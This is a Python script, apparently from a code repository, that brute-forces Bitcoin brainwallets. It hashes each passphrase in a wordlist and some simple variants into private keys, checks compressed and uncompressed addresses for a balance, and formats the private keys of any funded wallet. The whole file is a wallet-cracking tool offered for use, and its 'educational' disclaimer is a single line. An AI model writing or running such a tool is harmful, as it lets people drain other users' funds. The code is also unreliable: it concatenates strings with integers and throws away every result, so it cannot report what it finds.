#!/usr/bin/env python3
"""
Simple script to brute force bitcoin wallets with text file filled with passphrases
and print any keys with available balance. Program check for
both compressed and uncompressed versions of addresses using
bit library.

Example use: python brutecointxt.py -t passphrases.txt

DISCLAIMER: Program created for educational purposes only.
Don't steal anybody bitcoins and don't use easy to guess passphrases.
"""
import sys

from bit.format import bytes_to_wif # Uncompressed version of adress check shortcut
from tqdm import tqdm # Progress bar
from bit import Key # Generate private key, generate public key, check balance
import argparse # Argument parsing
import hashlib # Sha256 hashing


def format_bold_italic_if_more_than_zero(text, value):

    message_out = ""

    if value > 0.0:
        message_out = f"<b>{text}</b>\n"
    else:
        message_out = f"<i>{text}</i>\n"

    return message_out

def _check_passphrase(line_phrase, return_info_anyway = False):

    message_out = ""

    passphrase = line_phrase.strip("\n")
    to_check = [passphrase]
    
    #Additional options
    to_check.append(passphrase.lower())
    to_check.append(passphrase.upper())
    to_check.append(passphrase[::-1])

    for phrase in to_check:
        
        #Check compressed version for balance
        private_key_hex = hashlib.sha256(phrase.encode('utf-8')).hexdigest()
        private_key = Key.from_hex(private_key_hex)
        balance = float(private_key.balance)
        
        #Check uncompressed version for balance
        uncompressed_wif = bytes_to_wif(private_key.to_bytes(), compressed=False)
        uncompressed_key = Key(uncompressed_wif)
        balance += float(uncompressed_key.balance)
        
        if balance > 0.0 or return_info_anyway:

            message_out += "\nPassphrase: " + phrase + "\n"
            message_out += "Private key hex: " +  private_key_hex + "\n"
            message_out += "Private key wif: " +  private_key.to_wif() + "\n"
            message_out += format_bold_italic_if_more_than_zero("Tx Compressed: " + len(private_key.get_transactions()) + "\n", len(private_key.get_transactions()))
            message_out += format_bold_italic_if_more_than_zero("Tx Uncompressed: " + len(uncompressed_key.get_transactions()) + "\n", len(uncompressed_key.get_transactions()))
            message_out += f"Compressed address: <a href='https://www.blockchain.com/ru/explorer/addresses/btc/{private_key.address}'>" + private_key.address + "</a>\n"
            message_out += f"Uncompressed address: <a href='https://www.blockchain.com/ru/explorer/addresses/btc/{uncompressed_key.address}'>" + uncompressed_key.address + "</a>\n"
            message_out += format_bold_italic_if_more_than_zero("<b>Balance: " + str(balance) + "</b>\n", balance)
    
    return message_out

def check_passphrase(line_phrase):

    return _check_passphrase(line_phrase, False)

def file_check(file_data: str):
    
    out_message = ""

    total_lines = file_data.split('\n')

    for line in total_lines:
    
        result = check_passphrase(line)
        if result != "":
            out_message += result

def main():

    counter = 0
    lowercase = uppercase = reverse = uncompressed = False
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('-t', '--txt', action='store', dest='text_file',
                        help='Text file (UTF-8 encoding) with passphrases. Each line containting one example. (example: passphrases.txt)', required=True)

    args = parser.parse_args()

    try:
        with open(args.text_file) as file:
            total_lines = sum(1 for i in file)
            file.seek(0)
            bar = tqdm(total = total_lines,ascii=True)
            for line in file:
                
                check_passphrase(line)

                if counter % 1000 == 0:
                    bar.update(1000)
                counter += 1

    except IOError:
        print("File does not exist or is not accessible. Make sure encoding is UTF-8!")

if __name__ == '__main__':
    main()
